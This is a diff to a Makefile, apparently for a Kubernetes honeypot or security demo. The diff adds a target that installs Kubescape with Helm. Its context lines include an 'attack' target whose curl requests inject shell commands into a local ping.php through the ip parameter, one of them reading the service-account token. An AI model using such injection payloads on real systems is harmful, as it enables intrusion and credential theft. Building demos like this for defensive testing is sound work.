@@ -74,3 +74,9 @@ attack:
 	curl "127.0.0.1:8080/ping.php?ip=1.1.1.1%3Bcat%20index.html"
 	curl "127.0.0.1:8080/ping.php?ip=1.1.1.1%3Bcat%20/run/secrets/kubernetes.io/serviceaccount/token"
 	curl "127.0.0.1:8080/ping.php?ip=1.1.1.1%3Bcurl%20google.com"
+
+.PHONY: kubescape
+kubescape:
+	-$(HELM) repo add kubescape https://kubescape.github.io/helm-charts/
+	-$(HELM) repo update
+	$(HELM) upgrade --install kubescape kubescape/kubescape-operator -n honey --create-namespace --values kubescape/values.yaml
